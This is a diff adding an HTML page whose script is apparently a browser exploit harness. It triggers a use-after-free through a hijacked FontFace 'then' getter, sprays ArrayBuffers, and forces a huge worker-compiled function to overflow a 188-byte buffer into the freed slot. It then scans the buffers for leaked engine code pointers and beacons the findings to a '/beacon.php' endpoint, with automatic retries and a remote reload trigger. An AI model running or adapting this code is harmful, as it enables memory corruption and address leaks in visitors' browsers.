@@ -1,0 +1,236 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1187v7 188B-Buffer FL-Sweep Fusion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1187v7 — 188B-BUFFER FL-SWEEP FUSION</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1187-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1187v7: 188-BYTE BUFFER FUSION (PC-validated math).
+   N=38,347,923 -> wrap=80 -> buffer=188B -> rounds to the 192B class =
+   THE FL LEAK'S EXACT SIZE CLASS. Plan:
+   1. FL leak (then-getter) frees the 192B CSSFontFace + sprays AB(192)
+      witnesses (they sit ABOVE the freed slot in address order).
+   2. Worker compiles the blob (N=38,347,923, source 153.4MB) and calls
+      the fn -> the 188B metadata buffer (LIFO) takes the freed face's
+      slot -> the 4.29GB sweep flows FORWARD from the segregated tier
+      through ALL the witness ABs above -> 0xFFFFFFFF sig + JSC code
+      pointer written into them.
+   3. Main scans the leak ABs (the SAME scan channel as always).
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem('p1187v7_att')||'0');}catch(e){}
+try{localStorage.setItem('p1187v7_att',''+(attempt+1));}catch(e){}
+B('BOOT','attempt='+attempt);
+
+if(attempt>=3){
+  setStatus('IDLE');
+  B('IDLE','3 attempts done');
+  try{localStorage.removeItem('p1187v7_att');}catch(e){}
+}else{
+
+var N_TARGET=38347923;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+var witnesses=[];
+var goSent=false,lastB=0,deepDone=false;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return blob;
+}
+
+/* FL leak: frees the 192B face + sprays witnesses ABOVE it */
+function flLeak(cb){
+  var done=false;
+  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
+  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
+  try{
+    var fired=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(fired)return undefined;fired=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        /* witnesses: MANY sizes so the sweep's forward path crosses
+           readable memory of every tier */
+        var sizes=[192,192,192,256,256,384,512,1024,2048,4096,8192,16384,32768,65536,100224,102400];
+        witnesses=[];
+        for(var si=0;si<sizes.length;si++){
+          for(var k=0;k<40;k++)witnesses.push(new ArrayBuffer(sizes[si]));
+        }
+        try{document.fonts.check('1em s0');}catch(e){}
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+    setTimeout(function(){
+      var hit=false;
+      for(var i=0;i<witnesses.length&&!hit;i++){
+        var dv=new DataView(witnesses[i]);
+        for(var b=0x58;b<0x60;b++){if(dv.getUint8(b))hit=true;}
+      }
+      fin(hit);
+    },80);
+  }catch(e){B('FL-ERR',e.message);fin(null);}
+}
+
+function deepScan(ab,i){
+  var dv=new DataView(ab);
+  var len=ab.byteLength;
+  var nzQ=0,firstNZ='';
+  for(var q=0;q+7<len;q+=8){
+    var lo=dv.getUint32(q,true),hi=dv.getUint32(q+4,true);
+    if(lo||hi){nzQ++;if(!firstNZ)firstNZ='q'+q+'='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');}
+  }
+  var sigs=[];
+  for(var p=0;p+28<len;p+=4){
+    if(dv.getUint32(p,true)===0xFFFFFFFF){
+      var cpLo=dv.getUint32(p+12,true),cpHi=dv.getUint32(p+16,true);
+      var idx=dv.getUint32(p+56,true);
+      sigs.push('p='+p+'|cp=0x'+cpHi.toString(16).padStart(8,'0')+cpLo.toString(16).padStart(8,'0')+'|idx='+idx);
+      if(sigs.length>=3)break;
+    }
+  }
+  B('FIND','i='+i+'|sz='+len+'|nz='+nzQ+'|first='+firstNZ+'|sigs='+sigs.join(';'));
+  addFind('WITNESS['+i+'] sz='+len+': '+firstNZ+' | '+sigs.slice(0,2).join(' | '));
+  setStatus('*** HARVEST: '+firstNZ+' ***');
+  try{localStorage.setItem('p1187v7_find',JSON.stringify({i:i,first:firstNZ,sigs:sigs}));}catch(e){}
+  deepDone=true;
+}
+
+function poll(){
+  if(!goSent||deepDone)return;
+  for(var i=0;i<witnesses.length;i++){
+    var ab=witnesses[i];
+    if(!ab)continue;
+    var dv=new DataView(ab);
+    for(var q=0;q<128;q++){
+      var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
+      if(lo||hi){deepScan(ab,i);return;}
+    }
+  }
+  if(Date.now()-lastB>700){
+    lastB=Date.now();
+    B('POLL','wits='+witnesses.length+'|clean');
+    setCounters('witnesses='+witnesses.length+'|clean so far');
+  }
+  setTimeout(poll,10);
+}
+
+function runSweep(blob){
+  var blobUrl=URL.createObjectURL(blob);
+  var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
+    'self.onmessage=function(m){if(m.data==="go"){'+
+    'try{self.__v141fn(function(){ });}'+
+    'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
+  var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
+  var worker=new Worker(wUrl);
+  worker.__compiled=false;
+  worker.onmessage=function(m){
+    if(m.data&&m.data.t==='compiled'){
+      worker.__compiled=true;
+      B('WORKER-COMPILED','ok');
+      setPhase('GO');
+      setTimeout(function(){
+        goSent=true;
+        B('GO','sweep start (188B buffer)');
+        setStatus('SWEEP RUNNING — polling FL witnesses');
+        poll();
+        worker.postMessage('go');
+        setTimeout(function(){
+          B('SURVIVED','finds='+(deepDone?1:0));
+          B('DONE','survived');
+        },25000);
+      },300);
+    }
+    else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
+  };
+  B('WORKER','created');
+}
+
+setPhase('FL leak (frees 192B slot + witnesses)');
+flLeak(function(ok){
+  if(!ok){B('NORETRY');setStatus('FL miss - retry');setTimeout(function(){location.reload(true);},400);return;}
+  setPhase('building blob (153.4MB)');
+  var blob=buildBlob();
+  runSweep(blob);
+});
+
+setTimeout(function(){
+  if(!goSent){B('TIMEOUT','no go');B('DONE','timeout');}
+},90000);
+
+} /* attempts */
+
+(function(){
+  var cur='P1187-bait-switch-v7';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
